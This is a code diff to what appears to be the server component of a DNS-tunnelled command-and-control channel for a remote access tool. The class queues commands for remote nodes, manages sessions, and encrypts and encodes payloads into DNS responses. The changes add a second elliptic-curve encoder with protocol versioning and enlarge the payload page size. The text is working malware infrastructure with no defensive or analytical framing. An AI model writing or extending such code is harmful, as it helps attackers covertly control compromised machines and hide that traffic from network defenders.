@@ -173,12 +173,18 @@ class DnsCommandServerException(Exception):
         return repr(self.error)
 
 class DnsCommandServerHandler(BaseResolver):
+    ENCODER_V1 = 0
+    ENCODER_V2 = 1
+
     def __init__(self, domain, key, recursor=None, timeout=None):
         self.sessions = {}
         self.nodes = {}
         self.domain = domain
         self.recursor = recursor
-        self.encoder = ECPV(private_key=key)
+        self.encoders = (
+            ECPV(private_key=key[0]),
+            ECPV(private_key=key[1], curve='brainpoolP256r1')
+        )
         self.translation = dict(zip(
             ''.join([
                 ''.join([chr(x) for x in xrange(ord('a'), ord('z') + 1)]),
@@ -420,13 +426,13 @@ class DnsCommandServerHandler(BaseResolver):
         return self.add_command(cmd, session=node)
 
     @locked
-    def encode_pastelink_content(self, content):
+    def encode_pastelink_content(self, content, version=ENCODER_V2):
         h = hashlib.sha1()
         h.update(content)
 
         content = h.digest() + content
         content = zlib.compress(content, 9)
-        content = self.encoder.pack(content)
+        content = self.encoders[version].pack(content)
         content = ascii85.ascii85EncodeDG(content)
 
         return content
@@ -452,13 +458,13 @@ class DnsCommandServerHandler(BaseResolver):
         length = struct.pack('B', len(data))
         payload = length + data
 
-        if len(payload) > 48:
-            raise ValueError('Page size more than 46 bytes ({})'.format(len(payload)))
+        if len(payload) > 75:
+            raise ValueError('Page size more than 75 bytes ({})'.format(len(payload)))
 
         response = []
 
         for idx, part in enumerate([payload[i:i+3] for i in xrange(0, len(payload), 3)]):
-            header = (random.randint(1, 6) << 29)
+            header = (random.randint(1, 3) << 30)
             idx = idx << 25
             bits = ( struct.unpack('>I', '\x00'+part+chr(random.randrange(0, 255))*(3-len(part)))[0] ) << 1
             packed = struct.unpack('!BBBB', struct.pack('>I', header | idx | bits | int(not bool(bits & 6))))
@@ -492,26 +498,29 @@ class DnsCommandServerHandler(BaseResolver):
         spi = 0
         nonce = 0
         version = 1
+        encoder_version = self.ENCODER_V1
         csum_check = None
         csum_gen = None
 
         if len(parts) == 2:
             nonce_blob, data = parts
-            nonce = struct.unpack_from('>I', nonce_blob)[0]
+            nonce, = struct.unpack_from('>I', nonce_blob)
 
             if len(nonce_blob) > 4:
                 node_blob = nonce_blob[4:]
+                encoder_version = self.ENCODER_V2
 
-            encoder = self.encoder
+            encoder = self.encoders[encoder_version]
             session = None
 
         elif len(parts) == 3:
             spi, nonce_blob, data = parts
-            spi = struct.unpack('>I', spi)[0]
-            nonce = struct.unpack_from('>I', nonce_blob)[0]
+            spi, = struct.unpack('>I', spi)
+            nonce, = struct.unpack_from('>I', nonce_blob)
 
             if len(nonce_blob) > 4:
                 node_blob = nonce_blob[4:]
+                encoder_version = self.ENCODER_V2
 
             session = None
             with self.lock:
@@ -711,11 +720,14 @@ class DnsCommandServerHandler(BaseResolver):
             with self.lock:
                 response = []
 
+                encoder_version = \
+                  self.ENCODER_V1 if version == 1 else self.ENCODER_V2
+
                 if not command.spi in self.sessions:
                     self.sessions[command.spi] = Session(
                         node, cid,
                         command.spi,
-                        self.encoder.clone(),
+                        self.encoders[encoder_version].clone(),
                         self.commands,
                         self.timeout
                     )
@@ -765,6 +777,7 @@ class DnsCommandServerHandler(BaseResolver):
         session = None
         nonce = None
 
+        version = 1
         csum_check, csum_gen = None, None
 
         try:
@@ -829,7 +842,8 @@ class DnsCommandServerHandler(BaseResolver):
         logger.debug('responses={} session={}'.format(
             responses, '{:08x}'.format(session.spi) if session else None))
 
-        encoder = session.encoder if session else self.encoder
+        encoder_version = self.ENCODER_V1 if version == 1 else self.ENCODER_V2
+        encoder = session.encoder if session else self.encoders[encoder_version]
 
         try:
             payload = Parcel(*responses).pack(nonce, csum_gen)
